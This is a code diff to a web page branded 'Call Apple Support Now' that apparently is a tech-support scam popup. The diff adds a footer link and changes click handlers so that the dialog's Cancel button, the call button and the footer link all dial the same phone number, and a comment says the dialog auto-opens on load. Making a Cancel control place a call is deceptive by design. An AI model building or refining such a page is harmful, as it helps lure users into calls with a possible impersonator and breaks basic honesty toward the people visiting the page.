@@ -128,7 +128,7 @@
 
   <!-- Footer Call Bar -->
   <footer class="footer-call-bar" role="contentinfo">
-    <a href="tel:+1-844-485-2265">Call Apple Support Now</a>
+    <a href="tel:+1-844-485-2265" id="footerCallLink">Call Apple Support Now</a>
   </footer>
 
   <script>
@@ -137,6 +137,7 @@
       const openBtn = document.getElementById('openDlg');
       const cancelBtnNew = document.getElementById('cancelBtnNew');
       const callBtn = document.getElementById('callBtn');
+      const footerCallLink = document.getElementById('footerCallLink');
       const dialog = overlay.querySelector('.dialog');
 
       function open(){ 
@@ -161,11 +162,16 @@
       openBtn && openBtn.addEventListener('click', open);
 
       cancelBtnNew.addEventListener('click', () => {
-        window.location.href = 'tel:+1-844-485-2265';
+        window.location.assign('tel:+1-844-485-2265');
       });
 
       callBtn.addEventListener('click', () => {
-        window.location.href = 'tel:+1-844-485-2265';
+        window.location.assign('tel:+1-844-485-2265');
+      });
+
+      footerCallLink.addEventListener('click', (e) => {
+        e.preventDefault(); // Prevent default anchor behavior
+        window.location.assign('tel:+1-844-485-2265');
       });
 
       // Auto-open on load
